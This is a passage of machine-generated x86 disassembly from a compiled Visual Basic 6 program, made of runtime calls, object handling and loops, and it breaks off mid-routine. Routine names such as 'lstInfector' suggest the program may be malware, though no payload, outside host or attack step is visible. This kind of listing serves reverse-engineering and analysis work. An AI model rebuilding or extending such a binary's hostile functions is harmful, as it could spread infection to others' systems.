0086A589: mov eax, [eax]
0086A58B: mov ecx, var_0000027C
0086A591: mov ecx, [ecx]
0086A593: mov ecx, [ecx]
0086A595: push eax
0086A596: call [ecx+00000550h]
0086A59C: push eax
0086A59D: lea eax, var_40
0086A5A0: push eax
0086A5A1: call 00410A84h ; Set (object)
0086A5A6: push eax
0086A5A7: lea eax, var_6C
0086A5AA: push eax
0086A5AB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A5B0: add esp, 00000010h
0086A5B3: push eax
0086A5B4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086A5B9: push eax
0086A5BA: lea eax, var_44
0086A5BD: push eax
0086A5BE: call 00410A84h ; Set (object)
0086A5C3: push eax
0086A5C4: lea eax, var_7C
0086A5C7: push eax
0086A5C8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A5CD: add esp, 00000020h
0086A5D0: push eax
0086A5D1: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086A5D6: push eax
0086A5D7: lea eax, var_48
0086A5DA: push eax
0086A5DB: call 00410A84h ; Set (object)
0086A5E0: push eax
0086A5E1: lea eax, var_0000008C
0086A5E7: push eax
0086A5E8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A5ED: add esp, 00000020h
0086A5F0: push eax
0086A5F1: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086A5F6: mov var_000000F4, eax
0086A5FC: mov var_000000FC, 00000008h
0086A606: lea eax, var_24
0086A609: mov var_00000148, eax
0086A60F: mov var_00000150, 0000400Ch
0086A619: cmp [008F2010h], 00000000h
0086A620: jnz 86A63Dh
0086A622: push 008F2010h
0086A627: push 00433984h
0086A62C: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086A631: mov var_00000280, 008F2010h
0086A63B: jmp 86A647h
0086A63D: mov var_00000280, 008F2010h
0086A647: push 00000000h
0086A649: push 00000014h
0086A64B: push 00440E58h
0086A650: push 00000010h
0086A652: pop eax
0086A653: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086A658: lea esi, var_00000150
0086A65E: mov edi, esp
0086A660: movsd 
0086A661: movsd 
0086A662: movsd 
0086A663: movsd 
0086A664: push 00000001h
0086A666: push 00000000h
0086A668: push 00440E48h
0086A66D: push 00000000h
0086A66F: push 00000018h
0086A671: mov eax, var_00000280
0086A677: mov eax, [eax]
0086A679: mov ecx, var_00000280
0086A67F: mov ecx, [ecx]
0086A681: mov ecx, [ecx]
0086A683: push eax
0086A684: call [ecx+00000550h]
0086A68A: push eax
0086A68B: lea eax, var_4C
0086A68E: push eax
0086A68F: call 00410A84h ; Set (object)
0086A694: push eax
0086A695: lea eax, var_0000009C
0086A69B: push eax
0086A69C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A6A1: add esp, 00000010h
0086A6A4: push eax
0086A6A5: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086A6AA: push eax
0086A6AB: lea eax, var_50
0086A6AE: push eax
0086A6AF: call 00410A84h ; Set (object)
0086A6B4: push eax
0086A6B5: lea eax, var_000000AC
0086A6BB: push eax
0086A6BC: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A6C1: add esp, 00000020h
0086A6C4: push eax
0086A6C5: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086A6CA: push eax
0086A6CB: lea eax, var_54
0086A6CE: push eax
0086A6CF: call 00410A84h ; Set (object)
0086A6D4: push eax
0086A6D5: lea eax, var_000000BC
0086A6DB: push eax
0086A6DC: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A6E1: add esp, 00000010h
0086A6E4: push eax
0086A6E5: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086A6EA: mov var_000000D4, eax
0086A6F0: mov var_000000DC, 00000008h
0086A6FA: push 00000010h
0086A6FC: pop eax
0086A6FD: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086A702: lea esi, var_00000170
0086A708: mov edi, esp
0086A70A: movsd 
0086A70B: movsd 
0086A70C: movsd 
0086A70D: movsd 
0086A70E: push 00000010h
0086A710: pop eax
0086A711: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086A716: lea esi, var_000000FC
0086A71C: mov edi, esp
0086A71E: movsd 
0086A71F: movsd 
0086A720: movsd 
0086A721: movsd 
0086A722: push 00000001h
0086A724: push 00000010h
0086A726: push 00440E58h
0086A72B: push 00000010h
0086A72D: pop eax
0086A72E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086A733: lea esi, var_000000DC
0086A739: mov edi, esp
0086A73B: movsd 
0086A73C: movsd 
0086A73D: movsd 
0086A73E: movsd 
0086A73F: push 00000001h
0086A741: push 00000000h
0086A743: push 00440E48h
0086A748: push 00000000h
0086A74A: push 00000018h
0086A74C: push var_000001AC
0086A752: lea eax, var_000000CC
0086A758: push eax
0086A759: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A75E: add esp, 00000010h
0086A761: push eax
0086A762: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086A767: push eax
0086A768: lea eax, var_58
0086A76B: push eax
0086A76C: call 00410A84h ; Set (object)
0086A771: push eax
0086A772: lea eax, var_000000EC
0086A778: push eax
0086A779: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A77E: add esp, 00000020h
0086A781: push eax
0086A782: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086A787: push eax
0086A788: lea eax, var_5C
0086A78B: push eax
0086A78C: call 00410A84h ; Set (object)
0086A791: push eax
0086A792: call 0041095Eh ; msvbvm60.dll.__vbaLateIdCallSt
0086A797: add esp, 0000002Ch
0086A79A: lea eax, var_5C
0086A79D: push eax
0086A79E: lea eax, var_58
0086A7A1: push eax
0086A7A2: lea eax, var_54
0086A7A5: push eax
0086A7A6: lea eax, var_50
0086A7A9: push eax
0086A7AA: lea eax, var_4C
0086A7AD: push eax
0086A7AE: lea eax, var_48
0086A7B1: push eax
0086A7B2: lea eax, var_44
0086A7B5: push eax
0086A7B6: lea eax, var_40
0086A7B9: push eax
0086A7BA: push 00000008h
0086A7BC: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086A7C1: add esp, 00000024h
0086A7C4: lea eax, var_000000FC
0086A7CA: push eax
0086A7CB: lea eax, var_000000EC
0086A7D1: push eax
0086A7D2: lea eax, var_000000DC
0086A7D8: push eax
0086A7D9: lea eax, var_000000CC
0086A7DF: push eax
0086A7E0: lea eax, var_000000BC
0086A7E6: push eax
0086A7E7: lea eax, var_000000AC
0086A7ED: push eax
0086A7EE: lea eax, var_0000009C
0086A7F4: push eax
0086A7F5: lea eax, var_0000008C
0086A7FB: push eax
0086A7FC: lea eax, var_7C
0086A7FF: push eax
0086A800: lea eax, var_6C
0086A803: push eax
0086A804: push 0000000Ah
0086A806: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086A80B: add esp, 0000002Ch
0086A80E: mov var_00000168, 00000004h
0086A818: mov var_00000170, 00000003h
0086A822: mov var_00000128, 00000007h
0086A82C: mov var_00000130, 00000003h
0086A836: lea eax, var_24
0086A839: mov var_00000118, eax
0086A83F: mov var_00000120, 0000400Ch
0086A849: cmp [008F2010h], 00000000h
0086A850: jnz 86A86Dh
0086A852: push 008F2010h
0086A857: push 00433984h
0086A85C: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086A861: mov var_00000284, 008F2010h
0086A86B: jmp 86A877h
0086A86D: mov var_00000284, 008F2010h
0086A877: push 00000010h
0086A879: pop eax
0086A87A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086A87F: lea esi, var_00000130
0086A885: mov edi, esp
0086A887: movsd 
0086A888: movsd 
0086A889: movsd 
0086A88A: movsd 
0086A88B: push 00000001h
0086A88D: push 00000010h
0086A88F: push 00440E58h
0086A894: push 00000010h
0086A896: pop eax
0086A897: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086A89C: lea esi, var_00000120
0086A8A2: mov edi, esp
0086A8A4: movsd 
0086A8A5: movsd 
0086A8A6: movsd 
0086A8A7: movsd 
0086A8A8: push 00000001h
0086A8AA: push 00000000h
0086A8AC: push 00440E48h
0086A8B1: push 00000000h
0086A8B3: push 00000018h
0086A8B5: mov eax, var_00000284
0086A8BB: mov eax, [eax]
0086A8BD: mov ecx, var_00000284
0086A8C3: mov ecx, [ecx]
0086A8C5: mov ecx, [ecx]
0086A8C7: push eax
0086A8C8: call [ecx+00000550h]
0086A8CE: push eax
0086A8CF: lea eax, var_40
0086A8D2: push eax
0086A8D3: call 00410A84h ; Set (object)
0086A8D8: push eax
0086A8D9: lea eax, var_6C
0086A8DC: push eax
0086A8DD: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A8E2: add esp, 00000010h
0086A8E5: push eax
0086A8E6: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086A8EB: push eax
0086A8EC: lea eax, var_44
0086A8EF: push eax
0086A8F0: call 00410A84h ; Set (object)
0086A8F5: push eax
0086A8F6: lea eax, var_7C
0086A8F9: push eax
0086A8FA: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A8FF: add esp, 00000020h
0086A902: push eax
0086A903: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086A908: push eax
0086A909: lea eax, var_48
0086A90C: push eax
0086A90D: call 00410A84h ; Set (object)
0086A912: push eax
0086A913: lea eax, var_0000008C
0086A919: push eax
0086A91A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A91F: add esp, 00000020h
0086A922: push eax
0086A923: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086A928: mov var_000000F4, eax
0086A92E: mov var_000000FC, 00000008h
0086A938: lea eax, var_24
0086A93B: mov var_00000148, eax
0086A941: mov var_00000150, 0000400Ch
0086A94B: cmp [008F2010h], 00000000h
0086A952: jnz 86A96Fh
0086A954: push 008F2010h
0086A959: push 00433984h
0086A95E: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086A963: mov var_00000288, 008F2010h
0086A96D: jmp 86A979h
0086A96F: mov var_00000288, 008F2010h
0086A979: push 00000000h
0086A97B: push 00000014h
0086A97D: push 00440E58h
0086A982: push 00000010h
0086A984: pop eax
0086A985: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086A98A: lea esi, var_00000150
0086A990: mov edi, esp
0086A992: movsd 
0086A993: movsd 
0086A994: movsd 
0086A995: movsd 
0086A996: push 00000001h
0086A998: push 00000000h
0086A99A: push 00440E48h
0086A99F: push 00000000h
0086A9A1: push 00000018h
0086A9A3: mov eax, var_00000288
0086A9A9: mov eax, [eax]
0086A9AB: mov ecx, var_00000288
0086A9B1: mov ecx, [ecx]
0086A9B3: mov ecx, [ecx]
0086A9B5: push eax
0086A9B6: call [ecx+00000550h]
0086A9BC: push eax
0086A9BD: lea eax, var_4C
0086A9C0: push eax
0086A9C1: call 00410A84h ; Set (object)
0086A9C6: push eax
0086A9C7: lea eax, var_0000009C
0086A9CD: push eax
0086A9CE: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A9D3: add esp, 00000010h
0086A9D6: push eax
0086A9D7: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086A9DC: push eax
0086A9DD: lea eax, var_50
0086A9E0: push eax
0086A9E1: call 00410A84h ; Set (object)
0086A9E6: push eax
0086A9E7: lea eax, var_000000AC
0086A9ED: push eax
0086A9EE: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A9F3: add esp, 00000020h
0086A9F6: push eax
0086A9F7: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086A9FC: push eax
0086A9FD: lea eax, var_54
0086AA00: push eax
0086AA01: call 00410A84h ; Set (object)
0086AA06: push eax
0086AA07: lea eax, var_000000BC
0086AA0D: push eax
0086AA0E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086AA13: add esp, 00000010h
0086AA16: push eax
0086AA17: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086AA1C: mov var_000000D4, eax
0086AA22: mov var_000000DC, 00000008h
0086AA2C: push 00000010h
0086AA2E: pop eax
0086AA2F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086AA34: lea esi, var_00000170
0086AA3A: mov edi, esp
0086AA3C: movsd 
0086AA3D: movsd 
0086AA3E: movsd 
0086AA3F: movsd 
0086AA40: push 00000010h
0086AA42: pop eax
0086AA43: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086AA48: lea esi, var_000000FC
0086AA4E: mov edi, esp
0086AA50: movsd 
0086AA51: movsd 
0086AA52: movsd 
0086AA53: movsd 
0086AA54: push 00000001h
0086AA56: push 00000010h
0086AA58: push 00440E58h
0086AA5D: push 00000010h
0086AA5F: pop eax
0086AA60: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086AA65: lea esi, var_000000DC
0086AA6B: mov edi, esp
0086AA6D: movsd 
0086AA6E: movsd 
0086AA6F: movsd 
0086AA70: movsd 
0086AA71: push 00000001h
0086AA73: push 00000000h
0086AA75: push 00440E48h
0086AA7A: push 00000000h
0086AA7C: push 00000018h
0086AA7E: push var_000001AC
0086AA84: lea eax, var_000000CC
0086AA8A: push eax
0086AA8B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086AA90: add esp, 00000010h
0086AA93: push eax
0086AA94: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086AA99: push eax
0086AA9A: lea eax, var_58
0086AA9D: push eax
0086AA9E: call 00410A84h ; Set (object)
0086AAA3: push eax
0086AAA4: lea eax, var_000000EC
0086AAAA: push eax
0086AAAB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086AAB0: add esp, 00000020h
0086AAB3: push eax
0086AAB4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086AAB9: push eax
0086AABA: lea eax, var_5C
0086AABD: push eax
0086AABE: call 00410A84h ; Set (object)
0086AAC3: push eax
0086AAC4: call 0041095Eh ; msvbvm60.dll.__vbaLateIdCallSt
0086AAC9: add esp, 0000002Ch
0086AACC: lea eax, var_5C
0086AACF: push eax
0086AAD0: lea eax, var_58
0086AAD3: push eax
0086AAD4: lea eax, var_54
0086AAD7: push eax
0086AAD8: lea eax, var_50
0086AADB: push eax
0086AADC: lea eax, var_4C
0086AADF: push eax
0086AAE0: lea eax, var_48
0086AAE3: push eax
0086AAE4: lea eax, var_44
0086AAE7: push eax
0086AAE8: lea eax, var_40
0086AAEB: push eax
0086AAEC: push 00000008h
0086AAEE: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086AAF3: add esp, 00000024h
0086AAF6: lea eax, var_000000FC
0086AAFC: push eax
0086AAFD: lea eax, var_000000EC
0086AB03: push eax
0086AB04: lea eax, var_000000DC
0086AB0A: push eax
0086AB0B: lea eax, var_000000CC
0086AB11: push eax
0086AB12: lea eax, var_000000BC
0086AB18: push eax
0086AB19: lea eax, var_000000AC
0086AB1F: push eax
0086AB20: lea eax, var_0000009C
0086AB26: push eax
0086AB27: lea eax, var_0000008C
0086AB2D: push eax
0086AB2E: lea eax, var_7C
0086AB31: push eax
0086AB32: lea eax, var_6C
0086AB35: push eax
0086AB36: push 0000000Ah
0086AB38: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086AB3D: add esp, 0000002Ch
0086AB40: push 00000000h
0086AB42: lea eax, var_000001AC
0086AB48: push eax
0086AB49: call 004108E0h ; msvbvm60.dll.__vbaObjSetAddref
0086AB4E: lea eax, var_24
0086AB51: mov var_00000118, eax
0086AB57: mov var_00000120, 0000400Ch
0086AB61: cmp [008F2010h], 00000000h
0086AB68: jnz 86AB85h
0086AB6A: push 008F2010h
0086AB6F: push 00433984h
0086AB74: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086AB79: mov var_0000028C, 008F2010h
0086AB83: jmp 86AB8Fh
0086AB85: mov var_0000028C, 008F2010h
0086AB8F: push 00000000h
0086AB91: push 00000014h
0086AB93: push 00440E58h
0086AB98: push 00000010h
0086AB9A: pop eax
0086AB9B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086ABA0: lea esi, var_00000120
0086ABA6: mov edi, esp
0086ABA8: movsd 
0086ABA9: movsd 
0086ABAA: movsd 
0086ABAB: movsd 
0086ABAC: push 00000001h
0086ABAE: push 00000000h
0086ABB0: push 00440E48h
0086ABB5: push 00000000h
0086ABB7: push 00000018h
0086ABB9: mov eax, var_0000028C
0086ABBF: mov eax, [eax]
0086ABC1: mov ecx, var_0000028C
0086ABC7: mov ecx, [ecx]
0086ABC9: mov ecx, [ecx]
0086ABCB: push eax
0086ABCC: call [ecx+00000550h]
0086ABD2: push eax
0086ABD3: lea eax, var_40
0086ABD6: push eax
0086ABD7: call 00410A84h ; Set (object)
0086ABDC: push eax
0086ABDD: lea eax, var_6C
0086ABE0: push eax
0086ABE1: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086ABE6: add esp, 00000010h
0086ABE9: push eax
0086ABEA: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086ABEF: push eax
0086ABF0: lea eax, var_44
0086ABF3: push eax
0086ABF4: call 00410A84h ; Set (object)
0086ABF9: push eax
0086ABFA: lea eax, var_7C
0086ABFD: push eax
0086ABFE: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086AC03: add esp, 00000020h
0086AC06: push eax
0086AC07: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086AC0C: push eax
0086AC0D: lea eax, var_48
0086AC10: push eax
0086AC11: call 00410A84h ; Set (object)
0086AC16: push eax
0086AC17: lea eax, var_0000008C
0086AC1D: push eax
0086AC1E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086AC23: add esp, 00000010h
0086AC26: push eax
0086AC27: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086AC2C: mov edx, eax
0086AC2E: lea ecx, var_38
0086AC31: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086AC36: push eax
0086AC37: call 004109DCh ; Val(arg_1)
0086AC3C: fstp real8 ptr var_00000198
0086AC42: push 00000000h
0086AC44: push 00000002h
0086AC46: push 00000001h
0086AC48: push 00000000h
0086AC4A: lea eax, var_00000110
0086AC50: push eax
0086AC51: push 00000010h
0086AC53: push 00000880h
0086AC58: call 00410946h ; ReDim
0086AC5D: add esp, 0000001Ch
0086AC60: lea eax, var_28
0086AC63: mov var_00000128, eax
0086AC69: mov var_00000130, 00004008h
0086AC73: lea esi, var_00000130
0086AC79: push 00000000h
0086AC7B: push var_00000110
0086AC81: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0086AC86: mov ecx, eax
0086AC88: mov edx, esi
0086AC8A: call 00410940h ; msvbvm60.dll.__vbaVarZero
0086AC8F: mov eax, [ebp+08h]
0086AC92: mov eax, [eax]
0086AC94: push [ebp+08h]
0086AC97: call [eax+00000300h]
0086AC9D: mov var_00000094, eax
0086ACA3: mov var_0000009C, 00000009h
0086ACAD: lea esi, var_0000009C
0086ACB3: push 00000001h
0086ACB5: push var_00000110
0086ACBB: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0086ACC0: mov ecx, eax
0086ACC2: mov edx, esi
0086ACC4: call 00410940h ; msvbvm60.dll.__vbaVarZero
0086ACC9: lea eax, var_30
0086ACCC: mov var_00000138, eax
0086ACD2: mov var_00000140, 00004005h
0086ACDC: lea esi, var_00000140
0086ACE2: push 00000002h
0086ACE4: push var_00000110
0086ACEA: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0086ACEF: mov ecx, eax
0086ACF1: mov edx, esi
0086ACF3: call 00410940h ; msvbvm60.dll.__vbaVarZero
0086ACF8: mov edx, 0043D7C8h ; x79
0086ACFD: lea ecx, var_3C
0086AD00: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
0086AD05: lea eax, var_00000110
0086AD0B: push eax
0086AD0C: lea eax, var_3C
0086AD0F: push eax
0086AD10: fld real8 ptr var_00000198
0086AD16: call 004108E6h ; msvbvm60.dll.__vbaFpI2
0086AD1B: push eax
0086AD1C: call 007A6910h
0086AD21: lea eax, var_00000110
0086AD27: push eax
0086AD28: push 00000000h
0086AD2A: call 00410934h ; Erase
0086AD2F: lea eax, var_3C
0086AD32: push eax
0086AD33: lea eax, var_38
0086AD36: push eax
0086AD37: push 00000002h
0086AD39: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0086AD3E: add esp, 0000000Ch
0086AD41: lea eax, var_48
0086AD44: push eax
0086AD45: lea eax, var_44
0086AD48: push eax
0086AD49: lea eax, var_40
0086AD4C: push eax
0086AD4D: push 00000003h
0086AD4F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086AD54: add esp, 00000010h
0086AD57: lea eax, var_0000008C
0086AD5D: push eax
0086AD5E: lea eax, var_7C
0086AD61: push eax
0086AD62: lea eax, var_6C
0086AD65: push eax
0086AD66: push 00000003h
0086AD68: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086AD6D: add esp, 00000010h
0086AD70: call 0041096Ah ; DoEvents
0086AD75: lea eax, var_000001EC
0086AD7B: push eax
0086AD7C: lea eax, var_000001DC
0086AD82: push eax
0086AD83: lea eax, var_24
0086AD86: push eax
0086AD87: call 00410A36h ; Next
0086AD8C: mov var_00000200, eax
0086AD92: cmp var_00000200, 00000000h
0086AD99: jnz 00869A58h
0086AD9F: mov var_04, 00000000h
0086ADA6: wait 
0086ADA7: push 0086AEA7h
0086ADAC: jmp 0086AE4Dh
0086ADB1: lea eax, var_3C
0086ADB4: push eax
0086ADB5: lea eax, var_38
0086ADB8: push eax
0086ADB9: push 00000002h
0086ADBB: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0086ADC0: add esp, 0000000Ch
0086ADC3: lea eax, var_5C
0086ADC6: push eax
0086ADC7: lea eax, var_58
0086ADCA: push eax
0086ADCB: lea eax, var_54
0086ADCE: push eax
0086ADCF: lea eax, var_50
0086ADD2: push eax
0086ADD3: lea eax, var_4C
0086ADD6: push eax
0086ADD7: lea eax, var_48
0086ADDA: push eax
0086ADDB: lea eax, var_44
0086ADDE: push eax
0086ADDF: lea eax, var_40
0086ADE2: push eax
0086ADE3: push 00000008h
0086ADE5: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086ADEA: add esp, 00000024h
0086ADED: lea eax, var_0000010C
0086ADF3: push eax
0086ADF4: lea eax, var_000000FC
0086ADFA: push eax
0086ADFB: lea eax, var_000000EC
0086AE01: push eax
0086AE02: lea eax, var_000000DC
0086AE08: push eax
0086AE09: lea eax, var_000000CC
0086AE0F: push eax
0086AE10: lea eax, var_000000BC
0086AE16: push eax
0086AE17: lea eax, var_000000AC
0086AE1D: push eax
0086AE1E: lea eax, var_0000009C
0086AE24: push eax
0086AE25: lea eax, var_0000008C
0086AE2B: push eax
0086AE2C: lea eax, var_7C
0086AE2F: push eax
0086AE30: lea eax, var_6C
0086AE33: push eax
0086AE34: push 0000000Bh
0086AE36: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086AE3B: add esp, 00000030h
0086AE3E: lea eax, var_00000110
0086AE44: push eax
0086AE45: push 00000000h
0086AE47: call 0041092Eh ; msvbvm60.dll.__vbaAryDestruct
0086AE4C: ret 
End Sub

Private sub lstInfector__86C929
0086C929: push ebp
0086C92A: mov ebp, esp
0086C92C: sub esp, 0000000Ch
0086C92F: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0086C934: mov eax, fs:[00h]
0086C93A: push eax
0086C93B: mov fs:[00000000h], esp
0086C942: push 00000054h
0086C944: pop eax
0086C945: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C94A: push ebx
0086C94B: push esi
0086C94C: push edi
0086C94D: mov var_0C, esp
0086C950: mov var_08, 0040D0E0h
0086C957: mov eax, [ebp+08h]
0086C95A: and eax, 00000001h
0086C95D: mov var_04, eax
0086C960: mov eax, [ebp+08h]
0086C963: and al, FEh
0086C965: mov [ebp+08h], eax
0086C968: mov eax, [ebp+08h]
0086C96B: mov eax, [eax]
0086C96D: push [ebp+08h]
0086C970: call [eax+04h]
0086C973: mov eax, [ebp+0Ch]
0086C976: cmp word ptr [eax], 0002h
0086C97A: jnz 0086CA54h
0086C980: mov var_50, 80020004h
0086C987: mov var_58, 0000000Ah
0086C98E: mov var_40, 80020004h
0086C995: mov var_48, 0000000Ah
0086C99C: mov var_30, 80020004h
0086C9A3: mov var_38, 0000000Ah
0086C9AA: mov var_20, 80020004h
0086C9B1: mov var_28, 0000000Ah
0086C9B8: push 00000010h
0086C9BA: pop eax
0086C9BB: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C9C0: lea esi, var_58
0086C9C3: mov edi, esp
0086C9C5: movsd 
0086C9C6: movsd 
0086C9C7: movsd 
0086C9C8: movsd 
0086C9C9: push 00000010h
0086C9CB: pop eax
0086C9CC: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C9D1: lea esi, var_48
0086C9D4: mov edi, esp
0086C9D6: movsd 
0086C9D7: movsd 
0086C9D8: movsd 
0086C9D9: movsd 
0086C9DA: push 00000010h
0086C9DC: pop eax
0086C9DD: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C9E2: lea esi, var_38
0086C9E5: mov edi, esp
0086C9E7: movsd 
0086C9E8: movsd 
0086C9E9: movsd 
0086C9EA: movsd 
0086C9EB: push 00000010h
0086C9ED: pop eax
0086C9EE: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C9F3: lea esi, var_28
0086C9F6: mov edi, esp
0086C9F8: movsd 
0086C9F9: movsd 
0086C9FA: movsd 
0086C9FB: movsd 
0086C9FC: mov eax, [ebp+08h]
0086C9FF: mov eax, [eax]
0086CA01: push [ebp+08h]
0086CA04: call [eax+00000318h]
0086CA0A: push eax
0086CA0B: lea eax, var_18
0086CA0E: push eax
0086CA0F: call 00410A84h ; Set (object)
0086CA14: push eax
0086CA15: mov eax, [ebp+08h]
0086CA18: mov eax, [eax]
0086CA1A: push [ebp+08h]
0086CA1D: call [eax+000002BCh]
0086CA23: fclex 
0086CA25: mov var_5C, eax
0086CA28: cmp var_5C, 00000000h
0086CA2C: jnl 86CA48h
0086CA2E: push 000002BCh
0086CA33: push 004449CCh
0086CA38: push [ebp+08h]
0086CA3B: push var_5C
0086CA3E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0086CA43: mov var_68, eax
0086CA46: jmp 86CA4Ch
0086CA48: and var_68, 00000000h
0086CA4C: lea ecx, var_18
0086CA4F: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0086CA54: mov var_04, 00000000h
0086CA5B: push 0086CA6Ch
0086CA60: jmp 86CA6Bh
0086CA62: lea ecx, var_18
0086CA65: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0086CA6A: ret 
End Sub

Private sub lstInfector__86C8B2
0086C8B2: push ebp
0086C8B3: mov ebp, esp
0086C8B5: sub esp, 0000000Ch
0086C8B8: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0086C8BD: mov eax, fs:[00h]
0086C8C3: push eax
0086C8C4: mov fs:[00000000h], esp
0086C8CB: push 00000008h
0086C8CD: pop eax
0086C8CE: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C8D3: push ebx
0086C8D4: push esi
0086C8D5: push edi
0086C8D6: mov var_0C, esp
0086C8D9: mov var_08, 0040D0D8h
0086C8E0: mov eax, [ebp+08h]
0086C8E3: and eax, 00000001h
0086C8E6: mov var_04, eax
0086C8E9: mov eax, [ebp+08h]
0086C8EC: and al, FEh
0086C8EE: mov [ebp+08h], eax
0086C8F1: mov eax, [ebp+08h]
0086C8F4: mov eax, [eax]
0086C8F6: push [ebp+08h]
0086C8F9: call [eax+04h]
0086C8FC: mov eax, [ebp+0Ch]
0086C8FF: or word ptr [eax], FFFFh
0086C903: mov var_04, 00000000h
0086C90A: mov eax, [ebp+08h]
0086C90D: mov eax, [eax]
0086C90F: push [ebp+08h]
0086C912: call [eax+08h]
0086C915: mov eax, var_04
0086C918: mov ecx, var_14
0086C91B: mov fs:[00000000h], ecx
0086C922: pop edi
0086C923: pop esi
0086C924: pop ebx
0086C925: leave 
0086C926: retn 0008h
End Sub

Private sub Form__86B712
0086B712: push ebp
0086B713: mov ebp, esp
0086B715: sub esp, 0000000Ch
0086B718: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0086B71D: mov eax, fs:[00h]
0086B723: push eax
0086B724: mov fs:[00000000h], esp
0086B72B: mov eax, 000000A0h
0086B730: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086B735: push ebx
0086B736: push esi
0086B737: push edi
0086B738: mov var_0C, esp
0086B73B: mov var_08, 0040D090h
0086B742: mov eax, [ebp+08h]
0086B745: and eax, 00000001h
0086B748: mov var_04, eax
0086B74B: mov eax, [ebp+08h]
0086B74E: and al, FEh
0086B750: mov [ebp+08h], eax
0086B753: mov eax, [ebp+08h]
0086B756: mov eax, [eax]
0086B758: push [ebp+08h]
0086B75B: call [eax+04h]
0086B75E: mov var_34, 80020004h
0086B765: mov var_3C, 0000000Ah
0086B76C: mov var_54, 80020004h
0086B773: mov var_5C, 0000000Ah
0086B77A: mov var_74, 00446714h ; ID
0086B781: mov var_7C, 00000008h
0086B788: mov var_00000094, 00000384h
0086B792: mov var_0000009C, 00000002h
0086B79C: push 00000010h
0086B79E: pop eax
0086B79F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086B7A4: lea esi, var_3C
0086B7A7: mov edi, esp
0086B7A9: movsd 
0086B7AA: movsd 
